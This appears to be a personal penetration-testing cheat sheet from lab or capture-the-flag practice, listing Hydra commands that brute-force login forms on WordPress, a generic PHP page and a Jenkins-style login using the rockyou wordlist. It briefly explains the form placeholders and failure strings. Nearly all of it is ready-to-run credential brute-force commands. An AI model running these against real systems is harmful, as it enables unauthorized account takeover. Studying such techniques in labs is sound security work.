WordPress
```bash
hydra -L wpusers -P /usr/share/wordlists/rockyou.txt colddboxeasy -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.103.199 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```


Generic php login
```bash
hydra -L usernames -P passwords $IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!" 
```
In the above command, the usernames and passwords list is provided and the form parameters are passed as well. ^USER^ placeholder will take in the username from the list ^PASS^ placeholder will take in the password from the list. After submit is the code produced by the failing login

Another example how to craft the hydra command. First using burpsuite.

![](<Pasted image 20240122221235.png>)

Using command to brute force:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -s 8000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -V
```

Or using html source:
![](<Pasted image 20240123210025.png>)
 
 hydra command would look like this:
 ```bash
 hydra -L usernames -P passwords $IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
```